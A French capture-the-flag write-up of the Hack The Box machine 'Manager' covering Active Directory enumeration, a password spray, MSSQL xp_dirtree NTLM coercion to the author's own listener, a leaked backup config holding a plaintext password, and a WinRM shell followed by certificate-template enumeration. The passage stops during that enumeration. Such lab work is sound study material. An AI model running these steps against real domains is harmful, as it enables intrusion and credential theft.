| Room                                 | Manager                                     |
| ------------------------------------ | ------------------------------------------- |
| Url                                  | https://app.hackthebox.com/machines/Manager |
| Sujets                               | Windows/AD/ADCS                             |
| Active/Retired lors de la résolution | Active                                      |
| Difficulté                           | Medium                                      |

---

### Nmap:

```
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 07:53:13Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
##SNIP##
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
##SNIP##
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-22T07:50:26
| Not valid after:  2054-02-22T07:50:26
| MD5:   85f5:4fb8:7578:78df:69cf:b054:b2e7:29cc
| SHA-1: 7523:daf4:c653:0918:f90e:036c:a73a:5019:1ff0:4793
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQNacWjVih9JNNmmJkQkeUsTANBgkqhkiG9w0BAQsFADA7
##SNIP##
| aYA/nOd7X6y07FoTCee6uFRAo89Q6TJO0YrkDjLYFx/IWxkPYugo6XX/WHNXzgJz
| 94C4VA==
|_-----END CERTIFICATE-----
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
##SNIP##
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
##SNIP##
| A0xH1Q==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49683/tcp open  tcpwrapped    syn-ack
49732/tcp open  msrpc         syn-ack Microsoft Windows RPC
64099/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

On ajoute le domaine à notre fichier /etc/hosts:

```
10.10.11.236  manager.htb dc01.manager.htb
```

Je tente ensuite d'énumérer les sous-domaines:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.136 -H "HOST: FUZZ.manager.htb" 
```

Mais sans résultat. Un dig du DNS ne renvoie rien non plus, et un feroxbuster du site ne donne rien de particulier:

```bash
pak@DESKTOP-AF1CU53:~$ feroxbuster -u http://manager.htb -w /usr/share/wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://manager.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      224l      650w     7900c http://manager.htb/service.html
200      GET      507l     1356w    18203c http://manager.htb/index.html
200      GET       10l       42w     2704c http://manager.htb/images/call-o.png
200      GET        4l       20w     1337c http://manager.htb/images/s-2.png
200      GET        6l       22w     1052c http://manager.htb/images/location.png
200      GET      165l      367w     5317c http://manager.htb/contact.html
200      GET        9l       31w     2492c http://manager.htb/images/s-3.png
200      GET        6l       20w     1360c http://manager.htb/images/location-o.png
200      GET        9l       41w     2465c http://manager.htb/images/s-4.png
200      GET      157l      414w     5386c http://manager.htb/about.html
200      GET        6l       17w     1553c http://manager.htb/images/s-1.png
200      GET        7l       29w     1606c http://manager.htb/images/envelope-o.png
200      GET      614l     1154w    11838c http://manager.htb/css/style.css
200      GET       10l       43w     2023c http://manager.htb/images/call.png
200      GET       85l      128w     1389c http://manager.htb/css/responsive.css
200      GET       14l       48w     3837c http://manager.htb/images/logo.png
200      GET        9l       25w     1255c http://manager.htb/images/envelope.png
200      GET      149l      630w    53431c http://manager.htb/images/client.jpg
200      GET       82l      542w    56157c http://manager.htb/images/contact-img.jpg
200      GET     4437l    10999w   131863c http://manager.htb/js/bootstrap.js
200      GET        2l     1276w    88145c http://manager.htb/js/jquery-3.4.1.min.js
200      GET    10038l    19587w   192348c http://manager.htb/css/bootstrap.css
403      GET       29l       92w     1233c http://manager.htb/css/
403      GET       29l       92w     1233c http://manager.htb/images/
403      GET       29l       92w     1233c http://manager.htb/js/
200      GET     1313l     7384w   563817c http://manager.htb/images/about-img.png
200      GET      507l     1356w    18203c http://manager.htb/
301      GET        2l       10w      149c http://manager.htb/Images => http://manager.htb/Images/
301      GET        2l       10w      146c http://manager.htb/css => http://manager.htb/css/
301      GET        2l       10w      149c http://manager.htb/images => http://manager.htb/images/
301      GET        2l       10w      145c http://manager.htb/js => http://manager.htb/js/
```

On regarde du côté de smb, pour voir si éventuellement on aurait accès à un partage particulier :
```bash
pak@DESKTOP-AF1CU53:~$ smbclient -L 10.10.11.236
Password for [WORKGROUP\pak]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Bon, à première vue il ne reste pas énormément de solutions. Je tente une énumération d'utilisateur via kerbrute:

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ ./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/22/24 - Ronnie Flathers @ropnop

2024/02/22 02:03:43 >  Using KDC(s):
2024/02/22 02:03:43 >   dc01.manager.htb:88

2024/02/22 02:03:43 >  [+] VALID USERNAME:       ryan@manager.htb
2024/02/22 02:03:45 >  [+] VALID USERNAME:       guest@manager.htb
2024/02/22 02:03:45 >  [+] VALID USERNAME:       cheng@manager.htb
2024/02/22 02:03:46 >  [+] VALID USERNAME:       raven@manager.htb
2024/02/22 02:03:48 >  [+] VALID USERNAME:       administrator@manager.htb
2024/02/22 02:03:54 >  [+] VALID USERNAME:       Ryan@manager.htb
2024/02/22 02:03:55 >  [+] VALID USERNAME:       Raven@manager.htb
2024/02/22 02:03:58 >  [+] VALID USERNAME:       operator@manager.htb
2024/02/22 02:04:27 >  [+] VALID USERNAME:       Guest@manager.htb
2024/02/22 02:04:28 >  [+] VALID USERNAME:       Administrator@manager.htb
2024/02/22 02:04:48 >  [+] VALID USERNAME:       Cheng@manager.htb
2024/02/22 02:05:46 >  [+] VALID USERNAME:       jinwoo@manager.htb
2024/02/22 02:05:57 >  [+] VALID USERNAME:       RYAN@manager.htb
2024/02/22 02:06:33 >  [+] VALID USERNAME:       RAVEN@manager.htb
2024/02/22 02:06:35 >  [+] VALID USERNAME:       GUEST@manager.htb
2024/02/22 02:07:31 >  [+] VALID USERNAME:       Operator@manager.htb
2024/02/22 02:13:45 >  [+] VALID USERNAME:       OPERATOR@manager.htb
```

On voit quelques utilisateurs : ryan, cheng, raven, operator, jinwoo. Je mets ces noms d'utilisateur dans un fichier "userlist" pour me faciliter la vie plus tard.

On a quelques utilisateurs, on peut tenter de l'asreproasting :

```bash
pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -usersfile userlist -dc-ip 10.10.11.236 manager.htb/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jinwoo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User operator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Rhaaaa... je regarde si je n'ai rien oublié qui pourrait me sauter aux yeux, et pendant ce temps je lance un bruteforce sur ces utilisateurs pour tenter de trouver un mot de passe. C'est bourrin, j'aime pas trop, mais je ne vois rien d'autre d'évident. 

Au bout d'un temps certains, un pass est trouvé :).

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u ../tmp/userlist -p /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
##SNIP##
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```

operator:operator.... Aller, pourquoi pas.

Je confirme ces creds:

```
pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```

Oookay, on a un utilisateur. On peut continuer :) !

---
### Operator

Avec un utilisateur, on peut énumérer les autres. Je ne sais pas si ça me servira, mais en tout cas ça va dans ma liste !

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --users
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.236    389    DC01             [+] manager.htb\operator:operator
LDAP        10.10.11.236    389    DC01             [*] Total of records returned 13
LDAP        10.10.11.236    389    DC01             Administrator                  Built-in account for administering the computer/domain
LDAP        10.10.11.236    389    DC01             Guest                          Built-in account for guest access to the computer/domain
LDAP        10.10.11.236    389    DC01             krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.236    389    DC01             Zhong
LDAP        10.10.11.236    389    DC01             Cheng
LDAP        10.10.11.236    389    DC01             Ryan
LDAP        10.10.11.236    389    DC01             Raven
LDAP        10.10.11.236    389    DC01             JinWoo
LDAP        10.10.11.236    389    DC01             ChinHae
LDAP        10.10.11.236    389    DC01             Operator
```

On en profite pour tenter un kerberoasting qui ne donne rien :

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --kerberoasting kerberoasted.txt
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.236    389    DC01             [+] manager.htb\operator:operator
LDAP        10.10.11.236    389    DC01             No entries found!
```

Et voir si nous avons plus de droits sur les partages :

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

Rien de bien particulier. Je continue d'énumérer rapidement, et vois que je peux me connecter à la base de données MsSQL. Je pense que la suite se trouvera par ici :)...

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec mssql 10.10.11.236 -u operator -p operator -q 'SELECT name FROM master.dbo.sysdatabases;'
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
MSSQL       10.10.11.236    1433   DC01             name
MSSQL       10.10.11.236    1433   DC01             ------
MSSQL       10.10.11.236    1433   DC01             master
MSSQL       10.10.11.236    1433   DC01             tempdb
MSSQL       10.10.11.236    1433   DC01             model
MSSQL       10.10.11.236    1433   DC01             msdb
```

Je me connecte en direct au serveur :

```bash
pak@DESKTOP-AF1CU53:~/Downloads$ impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236
```

Ce qui me vient directement comme idée là-dessus, c'est de lancer responder sur ma machine, utiliser xp_dirtree sur le serveur et voir si j'obtiens une réponse :

```sql
SQL (MANAGER\Operator  guest@master)> xp_dirtree \\10.10.16.10\fauxpartage
subdirectory   depth   file
------------   -----   ----
SQL (MANAGER\Operator  guest@master)>
```

```bash
DC01$::MANAGER:7e9d3c9bb6415dff:5DA46A928DF5BF19541063C4CB527C17:0101000000000000803FF5899365DA012BF2D85E7EC63FC30000000002000800430033004200420001001E00570049004E002D004300330049005500360050005900320044004600330004003400570049004E002D00430033004900550036005000590032004400460033002E0043003300420042002E004C004F00430041004C000300140043003300420042002E004C004F00430041004C000500140043003300420042002E004C004F00430041004C0007000800803FF5899365DA0106000400020000000800300030000000000000000000000000300000A2CE93D6583FE8B00E95F0C748AA0E517A8E902DA9BF533DD7235C76C21DE6FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000
```

Okay, on a un résultat, voyons voir si il est exploitable... Evidemment, non, ce serait beaucoup trop simple :). 

---
### xp_dirtree

Par contre, xp_dirtree fonctionne donc je peux potentiellement me balader dans les fichiers du serveur:

```bash
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\', 1, 1;
subdirectory                depth   file
-------------------------   -----   ----
$Recycle.Bin                    1      0

Documents and Settings          1      0

inetpub                         1      0

PerfLogs                        1      0

Program Files                   1      0

Program Files (x86)             1      0

ProgramData                     1      0

Recovery                        1      0

SQL2019                         1      0

System Volume Information       1      0

Users                           1      0

Windows                         1      0
```

```bash
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1

contact.html                          1      1

css                                   1      0

images                                1      0

index.html                            1      1

js                                    1      0

service.html                          1      1

web.config                            1      1

website-backup-27-07-23-old.zip       1      1
```

Un fichier de backup à la racine du serveur web, intéressant, récupérons le :) ! 

```bash
pak@DESKTOP-AF1CU53:~/tmp$ wget http://manager.htb/website-backup-27-07-23-old.zip
--2024-02-22 14:06:04--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.10.11.236
Connecting to manager.htb (manager.htb)|10.10.11.236|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip    100%[==============================================================>]   1021K  3.78MB/s    in 0.3s

2024-02-22 14:06:05 (3.78 MB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

```bash
pak@DESKTOP-AF1CU53:~/tmp$ unzip website-backup-27-07-23-old.zip
Archive:  website-backup-27-07-23-old.zip
  inflating: .old-conf.xml
  inflating: about.html
  inflating: contact.html
  inflating: css/bootstrap.css
  inflating: css/responsive.css
  inflating: css/style.css
  inflating: css/style.css.map
  inflating: css/style.scss
  inflating: images/about-img.png
  inflating: images/body_bg.jpg
 extracting: images/call.png
 extracting: images/call-o.png
  inflating: images/client.jpg
  inflating: images/contact-img.jpg
 extracting: images/envelope.png
 extracting: images/envelope-o.png
  inflating: images/hero-bg.jpg
 extracting: images/location.png
 extracting: images/location-o.png
 extracting: images/logo.png
  inflating: images/menu.png
 extracting: images/next.png
 extracting: images/next-white.png
  inflating: images/offer-img.jpg
  inflating: images/prev.png
 extracting: images/prev-white.png
 extracting: images/quote.png
 extracting: images/s-1.png
 extracting: images/s-2.png
 extracting: images/s-3.png
 extracting: images/s-4.png
 extracting: images/search-icon.png
  inflating: index.html
  inflating: js/bootstrap.js
  inflating: js/jquery-3.4.1.min.js
  inflating: service.html
```

Tout de suite un fichier me saute aux yeux : .old-conf.xml

```bash
pak@DESKTOP-AF1CU53:~/tmp$ cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Bingo ! 

```bash
pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
```

Et un accès à WinRM en prime... :)

```bash
pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents>
```

---
### Raven

Bon, il serait temps de sortir l'AdPEAS :

```powershell
*Evil-WinRM* PS C:\Users\Raven\Documents> upload /home/pak/Tools/Windows/AD/adPEAS.ps1

Info: Uploading /home/pak/Tools/Windows/AD/adPEAS.ps1 to C:\Users\Raven\Documents\adPEAS.ps1

Data: 4159704 bytes of 4159704 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Raven\Documents> Import-Module .\adPEAS.ps1
*Evil-WinRM* PS C:\Users\Raven\Documents> Invoke-adPEAS

               _ _____  ______           _____
              | |  __ \|  ____|   /\    / ____|
      ____  __| | |__) | |__     /  \  | (___
     / _  |/ _  |  ___/|  __|   / /\ \  \___ \
    | (_| | (_| | |    | |____ / ____ \ ____) |
     \__,_|\__,_|_|    |______/_/    \_\_____/
                                            Version 0.8.13

    Active Directory Enumeration
    by @61106960

    Legend
        [?] Searching for juicy information
        [!] Found a vulnerability which may can be exploited in some way
        [+] Found some interesting information for further investigation
        [*] Some kind of note
        [#] Reserved


[?] +++++ Searching for Juicy Active Directory Information +++++

[?] +++++ Checking General Domain Information +++++
[+] Found general Active Directory domain information for domain 'manager.htb':
Domain Name:                            manager.htb
Domain SID:                             S-1-5-21-4078382237-1492182817-2568127209
Domain Functional Level:                Windows 2016
Forest Name:                            manager.htb
Forest Children:                        No Subdomain[s] available
Domain Controller:                      dc01.manager.htb

[?] +++++ Checking Domain Policies +++++
[+] Found password policy of domain 'manager.htb':
Minimum Password Age:                   1 days
Maximum Password Age:                   42 days
[+] Minimum Password Length:            7 character
[!] Password Complexity:                Disabled
[!] Lockout Account:                    Disabled
Reversible Encryption:                  Disabled
[+] Found Kerberos policy of domain 'manager.htb':
Maximum Age of TGT:                     10 hours
Maximum Age of TGS:                     600 minutes
Maximum Clock Time Difference:          5 minutes
Krbtgt Password Last Set:               07/27/2023 03:19:45

[?] +++++ Checking Domain Controller, Sites and Subnets +++++
[+] Found domain controller of domain 'manager.htb':
DC Host Name:                           dc01.manager.htb
DC Roles:                               SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole
DC IP Address:                          ::1
Site Name:                              Default-First-Site-Name


[?] +++++ Checking Forest and Domain Trusts +++++

[?] +++++ Checking Juicy Permissions +++++

[?] +++++ Checking Add-Computer Permissions +++++
[+] Filtering found identities that can add a computer object to domain '':
[!] Every member of group 'Authenticated Users' can add a computer to domain ''

distinguishedName:                      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=manager,DC=htb
objectSid:                              S-1-5-11
memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
                                        CN=Certificate Service DCOM Access,CN=Builtin,DC=manager,DC=htb
                                        CN=Users,CN=Builtin,DC=manager,DC=htb


[?] +++++ Checking DCSync Permissions +++++
[+] Filtering found identities that can perform DCSync in domain '':

[?] +++++ Checking LAPS Permissions +++++

[?] +++++ Searching for GPO local group membership Information +++++

[?] +++++ Searching for Active Directory Certificate Services Information +++++
[+] Found at least one available Active Directory Certificate Service
adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2

[+] Found Active Directory Certificate Services 'manager-DC01-CA':
CA Name:                                manager-DC01-CA
CA dnshostname:                         dc01.manager.htb
CA IP Address:                          10.10.11.236
Date of Creation:                       07/27/2023 10:31:05
DistinguishedName:                      CN=manager-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
NTAuthCertificates:                     True
Available Templates:                    SubCA
                                        DirectoryEmailReplication
                                        DomainControllerAuthentication
                                        KerberosAuthentication
                                        EFSRecovery
                                        EFS
                                        DomainController
                                        WebServer
                                        Machine
                                        User
                                        Administrator

[?] +++++ Searching for Vulnerable Certificate Templates +++++
adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy

[?] +++++ Checking Template 'SubCA' +++++
[!] Template 'SubCA' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
Template Name:                          SubCA
Template distinguishedname:             CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
Date of Creation:                       07/27/2023 10:31:05
EnrollmentFlag:                         0
[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT

[?] +++++ Checking Template 'DirectoryEmailReplication' +++++

[?] +++++ Checking Template 'DomainControllerAuthentication' +++++

[?] +++++ Checking Template 'KerberosAuthentication' +++++

[?] +++++ Checking Template 'EFSRecovery' +++++

[?] +++++ Checking Template 'EFS' +++++
[+] Identity 'MANAGER\Domain Users' has enrollment rights for template 'EFS'
Template Name:                          EFS
Template distinguishedname:             CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
Date of Creation:                       07/27/2023 10:31:05
Extended Key Usage:                     Encrypting File System
EnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
CertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
[+] Enrollment allowed for:             MANAGER\Domain Users

[?] +++++ Checking Template 'DomainController' +++++

[?] +++++ Checking Template 'WebServer' +++++
[!] Template 'WebServer' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
Template Name:                          WebServer
Template distinguishedname:             CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
Date of Creation:                       07/27/2023 10:31:05
Extended Key Usage:                     Server Authentication
EnrollmentFlag:                         0
[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT

[?] +++++ Checking Template 'Machine' +++++
[+] Identity 'MANAGER\Domain Computers' has enrollment rights for template 'Machine'
Template Name:                          Machine
